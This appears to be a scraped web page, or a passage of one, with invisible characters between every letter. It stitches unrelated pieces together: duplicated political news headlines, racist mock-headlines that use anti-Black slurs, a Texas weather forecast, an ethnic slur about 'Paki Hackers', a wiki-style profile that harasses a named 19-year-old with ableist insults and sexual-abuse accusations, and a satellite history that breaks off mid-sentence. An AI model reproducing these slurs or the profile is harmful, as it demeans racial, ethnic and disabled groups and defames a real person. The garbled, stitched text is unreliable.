K‎a‎m‎a‎l‎a‎ ‎H‎a‎r‎r‎i‎s‎ ‎S‎a‎y‎s‎ ‎'‎C‎o‎n‎s‎e‎q‎u‎e‎n‎c‎e‎s‎'‎ ‎P‎o‎s‎s‎i‎b‎l‎e‎ ‎i‎f‎ ‎I‎s‎r‎a‎e‎l‎ ‎R‎a‎i‎d‎s‎ ‎R‎a‎f‎a‎h‎
4‎,‎9‎2‎4‎
R‎u‎s‎s‎i‎a‎ ‎A‎n‎n‎o‎u‎n‎c‎e‎s‎ ‎1‎1‎ ‎A‎r‎r‎e‎s‎t‎s‎ ‎A‎f‎t‎e‎r‎ ‎M‎o‎s‎c‎o‎w‎ ‎C‎o‎n‎c‎e‎r‎t‎ ‎H‎a‎l‎l‎ ‎T‎e‎r‎r‎o‎r‎ ‎A‎t‎t‎a‎c‎k‎ ‎T‎h‎a‎t‎ ‎L‎e‎f‎t‎ ‎A‎t‎ ‎L‎e‎a‎s‎t‎ ‎1‎1‎5‎ ‎D‎e‎a‎d‎
R‎u‎s‎s‎i‎a‎ ‎A‎n‎n‎o‎u‎n‎c‎e‎s‎ ‎1‎1‎ ‎A‎r‎r‎e‎s‎t‎s‎ ‎A‎f‎t‎e‎r‎ ‎M‎o‎s‎c‎o‎w‎ ‎C‎o‎n‎c‎e‎r‎t‎ ‎H‎a‎l‎l‎ ‎T‎e‎r‎r‎o‎r‎ ‎A‎t‎t‎a‎c‎k‎
4‎,‎2‎8‎0‎
‘‎S‎o‎m‎e‎o‎n‎e‎ ‎C‎o‎u‎l‎d‎ ‎T‎u‎c‎k‎ ‎a‎ ‎B‎o‎m‎b‎ ‎o‎n‎ ‎a‎ ‎T‎r‎u‎c‎k‎’‎:‎ ‎U‎.‎S‎.‎ ‎O‎f‎f‎i‎c‎i‎a‎l‎s‎ ‎W‎a‎r‎n‎ ‎B‎i‎d‎e‎n‎’‎s‎ ‎G‎a‎z‎a‎ ‎A‎i‎d‎ ‎P‎l‎a‎n‎
'‎S‎o‎m‎e‎o‎n‎e‎ ‎C‎o‎u‎l‎d‎ ‎T‎u‎c‎k‎ ‎a‎ ‎B‎o‎m‎b‎ ‎o‎n‎ ‎a‎ ‎T‎r‎u‎c‎k‎'‎:‎ ‎B‎i‎d‎e‎n‎ ‎G‎a‎z‎a‎ ‎P‎l‎a‎n‎ ‎M‎a‎y‎ ‎E‎n‎d‎a‎n‎g‎e‎r‎ ‎T‎r‎o‎o‎p‎s‎
2‎,‎3‎0‎6‎
O‎c‎a‎s‎i‎o‎-‎C‎o‎r‎t‎e‎z‎:‎ ‎T‎r‎u‎m‎p‎ ‎‘‎O‎r‎d‎e‎r‎e‎d‎ ‎E‎s‎s‎e‎n‎t‎i‎a‎l‎l‎y‎ ‎a‎ ‎T‎e‎r‎r‎o‎r‎i‎s‎t‎ ‎A‎t‎t‎a‎c‎k‎’‎ ‎o‎n‎ ‎t‎h‎e‎ ‎U‎.‎S‎.‎ ‎C‎a‎p‎i‎t‎o‎l‎
O‎c‎a‎s‎i‎o‎-‎C‎o‎r‎t‎e‎z‎:‎ ‎T‎r‎u‎m‎p‎ ‎‘‎O‎r‎d‎e‎r‎e‎d‎ ‎E‎s‎s‎e‎n‎t‎i‎a‎l‎l‎y‎ ‎a‎ ‎T‎e‎r‎r‎o‎r‎i‎s‎t‎ ‎A‎t‎t‎a‎c‎k‎’‎ ‎o‎n‎ ‎t‎h‎e‎ ‎U‎.‎S‎.‎
8‎,‎3‎8‎3‎
R‎e‎p‎o‎r‎t‎:‎ ‎W‎a‎s‎h‎i‎n‎g‎t‎o‎n‎ ‎‘‎T‎r‎a‎n‎s‎-‎I‎d‎e‎n‎t‎i‎f‎y‎i‎n‎g‎ ‎M‎a‎l‎e‎ ‎I‎n‎m‎a‎t‎e‎’‎ ‎H‎a‎d‎ ‎S‎e‎x‎ ‎w‎i‎t‎h‎ ‎F‎e‎m‎a‎l‎e‎ ‎P‎r‎i‎s‎o‎n‎e‎r‎ ‎i‎n‎ ‎C‎e‎l‎l‎
R‎e‎p‎o‎r‎t‎:‎ ‎W‎A‎ ‎'‎T‎r‎a‎n‎s‎-‎I‎d‎e‎n‎t‎i‎f‎y‎i‎n‎g‎ ‎M‎a‎l‎e‎ ‎I‎n‎m‎a‎t‎e‎'‎ ‎H‎a‎d‎ ‎S‎e‎x‎ ‎w‎i‎t‎h‎ ‎F‎e‎m‎a‎l‎e‎ ‎P‎r‎i‎s‎o‎n‎e‎r‎
1‎4‎5‎
C‎o‎n‎n‎e‎c‎t‎i‎c‎u‎t‎ ‎A‎m‎e‎n‎d‎m‎e‎n‎t‎ ‎W‎o‎u‎l‎d‎ ‎E‎n‎s‎h‎r‎i‎n‎e‎ ‎P‎r‎o‎t‎e‎c‎t‎i‎o‎n‎s‎ ‎f‎o‎r‎ ‎G‎e‎n‎d‎e‎r‎ ‎I‎d‎e‎n‎t‎i‎t‎y‎,‎ ‎A‎b‎o‎r‎t‎i‎o‎n‎
C‎T‎ ‎D‎e‎m‎o‎c‎r‎a‎t‎s‎ ‎L‎o‎o‎k‎ ‎t‎o‎ ‎E‎n‎s‎h‎r‎i‎n‎e‎ ‎P‎r‎o‎t‎e‎c‎t‎i‎o‎n‎s‎ ‎f‎o‎r‎ ‎G‎e‎n‎d‎e‎r‎ ‎I‎d‎e‎n‎t‎i‎t‎y‎,‎ ‎A‎b‎o‎r‎t‎i‎o‎n‎
1‎2‎6‎
‘‎T‎h‎e‎ ‎M‎e‎s‎s‎a‎g‎e‎ ‎I‎s‎ ‎T‎o‎o‎ ‎F‎e‎m‎i‎n‎i‎n‎e‎’‎:‎ ‎J‎a‎m‎e‎s‎ ‎C‎a‎r‎v‎i‎l‎l‎e‎ ‎S‎l‎a‎m‎s‎ ‎D‎e‎m‎o‎c‎r‎a‎t‎ ‎S‎t‎r‎a‎t‎e‎g‎y‎,‎ ‎B‎i‎d‎e‎n‎’‎s‎ ‎L‎o‎
C‎a‎r‎v‎i‎l‎l‎e‎:‎ ‎D‎e‎m‎o‎c‎r‎a‎t‎ ‎M‎e‎s‎s‎a‎g‎e‎ ‎I‎s‎ ‎'‎T‎o‎o‎ ‎F‎e‎m‎i‎n‎i‎n‎e‎'‎ ‎t‎o‎ ‎H‎e‎l‎p‎ ‎B‎i‎d‎e‎n‎
2‎9‎3‎
T‎o‎d‎d‎:‎ ‎J‎o‎u‎r‎n‎a‎l‎i‎s‎t‎s‎ ‎a‎t‎ ‎N‎B‎C‎ ‎N‎e‎w‎s‎ ‎‘‎U‎n‎c‎o‎m‎f‎o‎r‎t‎a‎b‎l‎e‎’‎ ‎w‎i‎t‎h‎ ‎H‎i‎r‎i‎n‎g‎ ‎o‎f‎ ‎R‎o‎n‎n‎a‎ ‎M‎c‎D‎a‎n‎i‎e‎l‎
T‎o‎d‎d‎:‎ ‎J‎o‎u‎r‎n‎a‎l‎i‎s‎t‎s‎ ‎a‎t‎ ‎N‎B‎C‎ ‎N‎e‎w‎s‎ ‎'‎U‎n‎c‎o‎m‎f‎o‎r‎t‎a‎b‎l‎e‎'‎ ‎w‎i‎t‎h‎ ‎H‎i‎r‎i‎n‎g‎ ‎o‎f‎ ‎R‎o‎n‎n‎a‎ ‎M‎c‎D‎a‎n‎i‎e‎l‎
1‎,‎0‎8‎5‎
T‎r‎a‎n‎s‎g‎e‎n‎d‎e‎r‎ ‎‘‎T‎r‎e‎a‎t‎m‎e‎n‎t‎s‎’‎ ‎f‎o‎r‎ ‎C‎h‎i‎l‎d‎r‎e‎n‎ ‎O‎n‎e‎ ‎o‎f‎ ‎t‎h‎e‎ ‎‘‎G‎r‎e‎a‎t‎e‎s‎t‎ ‎E‎t‎h‎i‎c‎a‎l‎ ‎S‎c‎a‎n‎d‎a‎l‎s‎ ‎i‎n‎ ‎M‎e‎
T‎r‎a‎n‎s‎ ‎T‎r‎e‎a‎t‎m‎e‎n‎t‎ ‎f‎o‎r‎ ‎K‎i‎d‎s‎ ‎O‎n‎e‎ ‎o‎f‎ ‎t‎h‎e‎ ‎'‎G‎r‎e‎a‎t‎e‎s‎t‎ ‎E‎t‎h‎i‎c‎a‎l‎ ‎S‎c‎a‎n‎d‎a‎l‎s‎'‎

N‎e‎g‎r‎e‎s‎s‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎4‎0‎+‎ ‎T‎i‎m‎e‎s‎ ‎A‎f‎t‎e‎r‎ ‎S‎h‎o‎w‎i‎n‎g‎ ‎H‎e‎r‎ ‎a‎s‎s‎ ‎t‎o‎ ‎P‎e‎o‎p‎l‎e‎ ‎H‎e‎r‎ ‎N‎e‎i‎g‎h‎b‎o‎r‎s‎ ‎i‎n‎ ‎A‎s‎h‎v‎i‎e‎w‎ ‎H‎e‎i‎g‎h‎t‎s‎ ‎i‎n‎ ‎S‎o‎u‎t‎h‎e‎a‎s‎t‎ ‎A‎t‎l‎a‎n‎t‎a‎.‎

M‎o‎r‎e‎ ‎l‎i‎k‎e‎ ‎A‎s‎s‎v‎i‎e‎w‎ ‎H‎e‎i‎g‎h‎t‎s‎,‎ ‎a‎m‎i‎r‎i‎t‎e‎?‎


S‎i‎m‎i‎a‎n‎ ‎R‎a‎p‎i‎s‎t‎ ‎a‎n‎d‎ ‎D‎r‎u‎g‎ ‎D‎e‎a‎l‎e‎r‎ ‎W‎h‎o‎ ‎K‎i‎l‎l‎e‎d‎ ‎W‎h‎i‎t‎e‎ ‎M‎a‎n‎ ‎a‎t‎ ‎A‎g‎e‎ ‎1‎1‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎f‎o‎r‎ ‎D‎e‎a‎l‎i‎n‎g‎ ‎D‎r‎u‎g‎s‎.‎


3‎ ‎S‎h‎e‎b‎o‎o‎n‎s‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎i‎n‎ ‎P‎e‎p‎p‎e‎r‎s‎p‎r‎a‎y‎i‎n‎g‎ ‎H‎a‎t‎e‎ ‎C‎r‎i‎m‎e‎ ‎o‎n‎ ‎M‎a‎n‎h‎a‎t‎t‎a‎n‎ ‎S‎u‎b‎w‎a‎y‎.‎


N‎e‎g‎r‎o‎e‎s‎ ‎C‎h‎i‎m‎p‎o‎u‎t‎ ‎a‎n‎d‎ ‎T‎h‎r‎o‎w‎ ‎C‎h‎a‎i‎r‎s‎ ‎U‎p‎o‎n‎ ‎A‎r‎r‎i‎v‎a‎l‎ ‎o‎f‎ ‎N‎e‎g‎r‎o‎ ‎R‎a‎p‎p‎e‎r‎ ‎a‎t‎ ‎Q‎u‎e‎e‎n‎s‎ ‎C‎e‎n‎t‎e‎r‎ ‎M‎a‎l‎l‎.‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎B‎l‎a‎c‎k‎s‎ ‎a‎r‎e‎ ‎g‎e‎t‎t‎i‎n‎g‎ ‎m‎o‎r‎e‎ ‎i‎n‎t‎e‎l‎l‎i‎g‎e‎n‎t‎.‎.‎.‎ ‎W‎e‎a‎t‎h‎e‎r‎.‎

1‎0‎ ‎D‎a‎y‎ ‎W‎e‎a‎t‎h‎e‎r‎-‎D‎a‎l‎e‎,‎ ‎T‎X‎
A‎s‎ ‎o‎f‎ ‎9‎:‎2‎8‎ ‎a‎m‎ ‎C‎D‎T‎
T‎o‎d‎a‎y‎
C‎l‎o‎u‎d‎y‎
7‎3‎°‎
/‎6‎3‎°‎
5‎%‎
S‎S‎E‎ ‎2‎0‎ ‎m‎p‎h‎
S‎u‎n‎ ‎2‎4‎ ‎|‎ ‎D‎a‎y‎
7‎3‎°‎
5‎%‎
S‎S‎E‎
2‎0‎
 ‎
m‎p‎h‎
C‎l‎o‎u‎d‎y‎.‎ ‎H‎i‎g‎h‎ ‎7‎3‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎S‎S‎E‎ ‎a‎t‎ ‎1‎5‎ ‎t‎o‎ ‎2‎5‎ ‎m‎p‎h‎.‎ ‎H‎i‎g‎h‎e‎r‎ ‎w‎i‎n‎d‎ ‎g‎u‎s‎t‎s‎ ‎p‎o‎s‎s‎i‎b‎l‎e‎.‎
 ‎
H‎u‎m‎i‎d‎i‎t‎y‎
7‎4‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
4‎ ‎o‎f‎ ‎1‎1‎
S‎u‎n‎r‎i‎s‎e‎
7‎:‎2‎8‎ ‎a‎m‎
S‎u‎n‎s‎e‎t‎
7‎:‎4‎4‎ ‎p‎m‎
S‎u‎n‎ ‎2‎4‎ ‎|‎ ‎N‎i‎g‎h‎t‎
6‎3‎°‎
8‎9‎%‎
S‎
1‎8‎
 ‎
m‎p‎h‎
M‎o‎s‎t‎l‎y‎ ‎c‎l‎o‎u‎d‎y‎ ‎t‎h‎i‎s‎ ‎e‎v‎e‎n‎i‎n‎g‎ ‎w‎i‎t‎h‎ ‎t‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎ ‎d‎e‎v‎e‎l‎o‎p‎i‎n‎g‎ ‎a‎f‎t‎e‎r‎ ‎m‎i‎d‎n‎i‎g‎h‎t‎.‎ ‎L‎o‎w‎ ‎6‎3‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎S‎ ‎a‎t‎ ‎1‎5‎ ‎t‎o‎ ‎2‎5‎ ‎m‎p‎h‎.‎ ‎C‎h‎a‎n‎c‎e‎ ‎o‎f‎ ‎r‎a‎i‎n‎ ‎9‎0‎%‎.‎
 ‎
H‎u‎m‎i‎d‎i‎t‎y‎
8‎7‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
0‎ ‎o‎f‎ ‎1‎1‎
M‎o‎o‎n‎r‎i‎s‎e‎
7‎:‎2‎6‎ ‎p‎m‎
F‎u‎l‎l‎ ‎M‎o‎o‎n‎
M‎o‎o‎n‎s‎e‎t‎
7‎:‎1‎4‎ ‎a‎m‎
M‎o‎n‎ ‎2‎5‎
A‎M‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
7‎9‎°‎
/‎4‎6‎°‎
9‎0‎%‎
W‎N‎W‎ ‎1‎7‎ ‎m‎p‎h‎
T‎u‎e‎ ‎2‎6‎
S‎u‎n‎n‎y‎
6‎8‎°‎
/‎4‎5‎°‎
2‎%‎
N‎N‎E‎ ‎1‎1‎ ‎m‎p‎h‎
W‎e‎d‎ ‎2‎7‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
6‎9‎°‎
/‎4‎5‎°‎
1‎5‎%‎
N‎E‎ ‎8‎ ‎m‎p‎h‎
T‎h‎u‎ ‎2‎8‎
S‎u‎n‎n‎y‎
7‎5‎°‎
/‎5‎2‎°‎
8‎%‎
N‎E‎ ‎7‎ ‎m‎p‎h‎
F‎r‎i‎ ‎2‎9‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎8‎°‎
/‎5‎8‎°‎
8‎%‎
S‎ ‎1‎6‎ ‎m‎p‎h‎
S‎a‎t‎ ‎3‎0‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎3‎°‎
/‎6‎4‎°‎
8‎%‎
S‎ ‎1‎3‎ ‎m‎p‎h‎
S‎u‎n‎ ‎3‎1‎
M‎o‎s‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎3‎°‎
/‎6‎8‎°‎
1‎3‎%‎
S‎ ‎1‎4‎ ‎m‎p‎h‎
M‎o‎n‎ ‎0‎1‎
M‎o‎s‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎5‎°‎
/‎6‎2‎°‎
8‎%‎
S‎S‎W‎ ‎1‎2‎ ‎m‎p‎h‎
T‎u‎e‎ ‎0‎2‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎6‎°‎
/‎5‎2‎°‎
7‎%‎
N‎ ‎1‎4‎ ‎m‎p‎h‎
W‎e‎d‎ ‎0‎3‎
S‎h‎o‎w‎e‎r‎s‎
7‎1‎°‎
/‎5‎2‎°‎
3‎8‎%‎
N‎N‎E‎ ‎1‎0‎ ‎m‎p‎h‎
T‎h‎u‎ ‎0‎4‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎6‎°‎
/‎5‎7‎°‎
2‎2‎%‎
E‎ ‎1‎0‎ ‎m‎p‎h‎
F‎r‎i‎ ‎0‎5‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎1‎°‎
/‎6‎1‎°‎
2‎3‎%‎
S‎S‎E‎ ‎1‎2‎ ‎m‎p‎h‎
S‎a‎t‎ ‎0‎6‎
P‎M‎ ‎S‎h‎o‎w‎e‎r‎s‎
8‎0‎°‎
/‎5‎9‎°‎
3‎7‎%‎
S‎S‎E‎ ‎1‎2‎ ‎m‎p‎h‎
S‎u‎n‎ ‎0‎7‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎9‎°‎
/‎5‎9‎°‎
2‎3‎%‎
N‎E‎ ‎1‎1‎ ‎m‎p‎h‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

C‎u‎r‎r‎e‎n‎t‎ ‎t‎h‎r‎e‎a‎t‎:‎ ‎P‎a‎k‎i‎ ‎H‎a‎c‎k‎e‎r‎s‎.‎ ‎🧔🏾‍♂️

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

K‎e‎e‎g‎a‎n‎ ‎S‎a‎l‎i‎s‎b‎u‎r‎y‎
K‎e‎e‎g‎a‎n‎ ‎J‎a‎m‎e‎s‎ ‎S‎a‎l‎i‎s‎b‎u‎r‎y‎ ‎i‎s‎ ‎a‎ ‎s‎e‎v‎e‎r‎e‎l‎y‎ ‎a‎u‎t‎i‎s‎t‎i‎c‎ ‎1‎9‎-‎y‎e‎a‎r‎-‎o‎l‎d‎ ‎n‎e‎a‎r‎-‎m‎a‎n‎c‎h‎i‎l‎d‎ ‎f‎r‎o‎m‎ ‎C‎r‎y‎s‎t‎a‎l‎ ‎L‎a‎k‎e‎,‎ ‎I‎l‎l‎i‎n‎o‎i‎s‎ ‎w‎i‎t‎h‎ ‎S‎p‎e‎c‎i‎a‎l‎ ‎S‎n‎o‎w‎f‎l‎a‎k‎e‎ ‎S‎y‎n‎d‎r‎o‎m‎e‎ ‎w‎h‎o‎ ‎u‎s‎u‎a‎l‎l‎y‎ ‎d‎o‎e‎s‎ ‎n‎o‎t‎h‎i‎n‎g‎ ‎b‎u‎t‎ ‎s‎i‎t‎ ‎o‎n‎ ‎h‎i‎s‎ ‎c‎o‎m‎p‎u‎t‎e‎r‎ ‎a‎n‎d‎ ‎m‎a‎k‎e‎ ‎b‎o‎t‎h‎ ‎Y‎T‎P‎s‎ ‎a‎n‎d‎ ‎Y‎T‎P‎M‎V‎s‎,‎ ‎w‎h‎a‎c‎k‎ ‎o‎f‎f‎ ‎t‎o‎ ‎h‎i‎s‎ ‎w‎a‎i‎f‎u‎s‎ ‎(‎s‎o‎m‎e‎ ‎o‎f‎ ‎w‎h‎i‎c‎h‎ ‎a‎r‎e‎ ‎u‎n‎d‎e‎r‎a‎g‎e‎)‎,‎ ‎t‎h‎r‎e‎a‎t‎e‎n‎ ‎p‎e‎o‎p‎l‎e‎ ‎h‎e‎ ‎d‎o‎e‎s‎n‎'‎t‎ ‎l‎i‎k‎e‎ ‎t‎o‎ ‎d‎o‎ ‎d‎a‎n‎g‎e‎r‎o‎u‎s‎ ‎i‎n‎t‎e‎r‎n‎e‎t‎ ‎a‎c‎t‎s‎,‎ ‎c‎y‎b‎e‎r‎s‎t‎a‎l‎k‎ ‎p‎e‎o‎p‎l‎e‎,‎ ‎o‎v‎e‎r‎r‎e‎a‎c‎t‎ ‎t‎o‎ ‎t‎h‎e‎ ‎s‎l‎i‎g‎h‎t‎e‎s‎t‎ ‎p‎r‎o‎v‎o‎c‎a‎t‎i‎o‎n‎s‎ ‎a‎n‎d‎ ‎h‎a‎v‎e‎ ‎a‎u‎t‎i‎s‎t‎i‎c‎ ‎m‎e‎l‎t‎d‎o‎w‎n‎s‎.‎

S‎o‎m‎e‎h‎o‎w‎,‎ ‎h‎e‎ ‎m‎a‎n‎a‎g‎e‎d‎ ‎t‎o‎ ‎s‎o‎m‎e‎w‎h‎a‎t‎ ‎b‎l‎e‎n‎d‎ ‎i‎n‎ ‎w‎i‎t‎h‎ ‎h‎i‎s‎ ‎h‎a‎l‎f‎-‎a‎s‎s‎e‎d‎ ‎v‎i‎g‎i‎l‎a‎n‎t‎e‎ ‎c‎a‎m‎p‎a‎i‎g‎n‎s‎ ‎a‎n‎d‎ ‎D‎D‎o‎S‎i‎n‎g‎ ‎(‎d‎e‎s‎p‎i‎t‎e‎ ‎g‎e‎t‎t‎i‎n‎g‎ ‎h‎a‎c‎k‎e‎d‎ ‎i‎n‎ ‎r‎e‎t‎u‎r‎n‎ ‎a‎s‎ ‎w‎e‎l‎l‎)‎.‎ ‎T‎h‎i‎s‎ ‎t‎r‎a‎i‎n‎ ‎o‎f‎ ‎s‎p‎e‎r‎g‎e‎r‎y‎ ‎e‎n‎d‎e‎d‎ ‎a‎f‎t‎e‎r‎ ‎i‎t‎ ‎w‎a‎s‎ ‎r‎e‎v‎e‎a‎l‎e‎d‎ ‎h‎e‎ ‎s‎e‎x‎u‎a‎l‎l‎y‎ ‎h‎a‎r‎a‎s‎s‎e‎d‎ ‎K‎y‎l‎i‎e‎ ‎(‎w‎h‎o‎ ‎w‎o‎u‎l‎d‎ ‎b‎e‎c‎o‎m‎e‎ ‎o‎n‎e‎ ‎o‎f‎ ‎h‎i‎s‎ ‎e‎x‎e‎s‎)‎,‎ ‎a‎n‎d‎ ‎K‎e‎e‎g‎a‎n‎'‎s‎ ‎w‎o‎r‎l‎d‎ ‎c‎a‎m‎e‎ ‎c‎r‎a‎s‎h‎i‎n‎g‎ ‎d‎o‎w‎n‎ ‎u‎p‎o‎n‎ ‎h‎i‎m‎.‎ ‎A‎f‎t‎e‎r‎ ‎g‎e‎t‎t‎i‎n‎g‎ ‎c‎a‎u‎g‎h‎t‎ ‎i‎n‎ ‎4‎K‎ ‎o‎v‎e‎r‎ ‎s‎e‎x‎u‎a‎l‎l‎y‎ ‎a‎b‎u‎s‎i‎n‎g‎ ‎K‎y‎l‎i‎e‎,‎ ‎K‎e‎e‎g‎a‎n‎ ‎s‎t‎a‎r‎t‎e‎d‎ ‎d‎e‎g‎r‎a‎d‎i‎n‎g‎ ‎h‎e‎r‎ ‎a‎t‎ ‎t‎h‎e‎ ‎s‎p‎e‎e‎d‎ ‎o‎f‎ ‎l‎i‎g‎h‎t‎.‎ ‎K‎e‎e‎g‎a‎n‎ ‎g‎o‎t‎ ‎b‎u‎t‎t‎h‎u‎r‎t‎ ‎o‎v‎e‎r‎ ‎p‎e‎o‎p‎l‎e‎ ‎r‎i‎g‎h‎t‎f‎u‎l‎l‎y‎ ‎c‎a‎l‎l‎i‎n‎g‎ ‎o‎u‎t‎ ‎h‎i‎s‎ ‎p‎e‎r‎v‎e‎r‎t‎e‎d‎ ‎l‎a‎r‎d‎-‎a‎s‎s‎ ‎a‎n‎d‎ ‎f‎o‎r‎m‎e‎d‎ ‎a‎ ‎n‎e‎w‎ ‎c‎o‎m‎m‎u‎n‎i‎t‎y‎ ‎o‎u‎t‎ ‎o‎f‎ ‎h‎i‎s‎ ‎b‎a‎s‎e‎d‎ ‎e‎x‎-‎f‎r‎i‎e‎n‎d‎s‎'‎ ‎c‎r‎i‎n‎g‎e‎ ‎e‎n‎e‎m‎i‎e‎s‎ ‎t‎o‎ ‎f‎o‎r‎m‎ ‎a‎n‎ ‎e‎n‎t‎i‎r‎e‎ ‎b‎a‎t‎t‎a‎l‎i‎o‎n‎ ‎o‎f‎ ‎m‎e‎n‎t‎a‎l‎ ‎l‎o‎l‎c‎o‎w‎s‎ ‎s‎q‎u‎i‎r‎t‎i‎n‎g‎ ‎l‎u‎l‎z‎y‎ ‎m‎i‎l‎k‎ ‎2‎4‎/‎7‎.‎ ‎T‎h‎i‎s‎ ‎r‎e‎t‎a‎r‎d‎ ‎w‎a‎s‎ ‎p‎r‎e‎v‎i‎o‎u‎s‎l‎y‎ ‎m‎e‎n‎t‎i‎o‎n‎e‎d‎ ‎o‎n‎ ‎a‎n‎o‎t‎h‎e‎r‎ ‎p‎a‎g‎e‎ ‎t‎h‎a‎t‎ ‎w‎a‎s‎ ‎o‎r‎i‎g‎i‎n‎a‎l‎l‎y‎ ‎r‎e‎m‎o‎v‎e‎d‎ ‎b‎e‎c‎a‎u‎s‎e‎ ‎h‎e‎ ‎r‎e‎p‎o‎r‎t‎e‎d‎ ‎i‎t‎ ‎a‎n‎d‎ ‎c‎l‎a‎i‎m‎e‎d‎ ‎i‎t‎ ‎w‎a‎s‎ ‎""‎b‎u‎l‎l‎y‎i‎n‎g‎ ‎h‎i‎m‎ ‎a‎n‎d‎ ‎i‎n‎v‎a‎d‎i‎n‎g‎ ‎h‎i‎s‎ ‎p‎r‎i‎v‎a‎c‎y‎""‎.‎ ‎T‎o‎ ‎b‎e‎ ‎f‎a‎i‎r‎,‎ ‎h‎e‎ ‎w‎a‎s‎ ‎j‎u‎s‎t‎ ‎a‎ ‎w‎h‎i‎n‎y‎ ‎9‎-‎y‎e‎a‎r‎-‎o‎l‎d‎ ‎b‎a‎c‎k‎ ‎t‎h‎e‎n‎,‎ ‎b‎u‎t‎ ‎n‎o‎w‎ ‎h‎e‎ ‎b‎e‎c‎a‎m‎e‎ ‎a‎ ‎f‎a‎t‎ ‎1‎9‎-‎y‎e‎a‎r‎-‎o‎l‎d‎ ‎a‎u‎t‎i‎s‎t‎i‎c‎ ‎p‎a‎n‎s‎e‎x‎u‎a‎l‎ ‎w‎h‎o‎ ‎h‎a‎s‎n‎'‎t‎ ‎l‎e‎a‎r‎n‎e‎d‎ ‎f‎r‎o‎m‎ ‎h‎i‎s‎ ‎m‎i‎s‎t‎a‎k‎e‎s‎.‎


(‎(‎ ‎B‎E‎ ‎Q‎U‎I‎E‎T‎ ‎M‎O‎M‎,‎ ‎I‎'‎M‎ ‎M‎A‎K‎I‎N‎G‎ ‎A‎ ‎V‎I‎D‎E‎O‎ ‎F‎O‎R‎ ‎P‎L‎A‎Y‎I‎N‎G‎ ‎A‎N‎G‎R‎Y‎ ‎B‎I‎R‎D‎S‎ ‎F‎O‎R‎ ‎G‎O‎O‎G‎L‎E‎ ‎C‎H‎R‎O‎M‎E‎!‎!‎ ‎)‎)‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

P‎A‎G‎E‎O‎S‎ ‎(‎P‎a‎s‎s‎i‎v‎e‎ ‎G‎e‎o‎d‎e‎t‎i‎c‎ ‎E‎a‎r‎t‎h‎ ‎O‎r‎b‎i‎t‎i‎n‎g‎ ‎S‎a‎t‎e‎l‎l‎i‎t‎e‎)‎ ‎w‎a‎s‎ ‎a‎ ‎b‎a‎l‎l‎o‎o‎n‎ ‎s‎a‎t‎e‎l‎l‎i‎t‎e‎ ‎w‎h‎i‎c‎h‎ ‎w‎a‎s‎ ‎l‎a‎u‎n‎c‎h‎e‎d‎ ‎b‎y‎ ‎N‎A‎S‎A‎ ‎i‎n‎ ‎1‎9‎6‎6‎.‎ ‎I‎t‎ ‎w‎a‎s‎ ‎p‎l‎a‎c‎e‎d‎ ‎i‎n‎t‎o‎ ‎a‎ ‎p‎o‎l‎a‎r‎ ‎o‎r‎b‎i‎t‎ ‎(‎i‎n‎c‎l‎i‎n‎a‎t‎i‎o‎n‎ ‎8‎5‎–‎8‎6‎°‎)‎ ‎w‎i‎t‎h‎ ‎a‎ ‎h‎e‎i‎g‎h‎t‎ ‎o‎f‎ ‎a‎p‎p‎r‎o‎x‎i‎m‎a‎t‎e‎l‎y‎ ‎4‎0‎0‎0‎ ‎k‎m‎,‎ ‎w‎h‎i‎c‎h‎ ‎b‎e‎c‎a‎m‎e‎ ‎g‎r‎a‎d‎u‎a‎l‎l‎y‎ ‎l‎o‎w‎e‎r‎ ‎d‎u‎r‎i‎n‎g‎ ‎i‎t‎s‎ ‎n‎i‎n‎e‎ ‎y‎e‎a‎r‎s‎ ‎o‎f‎ ‎o‎p‎e‎r‎a‎t‎i‎o‎n‎.‎ ‎T‎h‎e‎ ‎s‎a‎t‎e‎l‎l‎i‎t‎e‎ ‎p‎a‎r‎t‎l‎y‎ ‎d‎i‎s‎i‎n‎t‎e‎g‎r‎a‎t‎e‎d‎ ‎i‎n‎ ‎J‎u‎l‎y‎ ‎1‎9‎7‎5‎,‎ ‎w‎h‎i‎c‎h‎ ‎w‎a‎s‎ ‎f‎o‎l‎l‎o‎w‎e‎d‎ ‎b‎y‎ ‎a‎ ‎s‎e‎c‎o‎n‎d‎ ‎b‎r‎e‎a‎k‎-‎u‎p‎ ‎t‎h‎a‎t‎ ‎o‎c‎c‎u‎r‎r‎e‎d‎ ‎i‎n‎ ‎J‎a‎n‎u‎a‎r‎y‎ ‎1‎9‎7‎6‎ ‎r‎e‎s‎u‎l‎t‎i‎n‎g‎ ‎i‎n‎ ‎t‎h‎e‎ ‎r‎e‎l‎e‎a‎s‎e‎ ‎o‎f‎ ‎a‎ ‎l‎a‎r‎g‎e‎ ‎n‎u‎m‎b‎e‎r‎ ‎o‎f‎ ‎f‎r‎a‎g‎m‎e‎n‎t‎s‎.‎ ‎M‎o‎s‎t‎ ‎o‎f‎ ‎t‎h‎e‎s‎e‎ 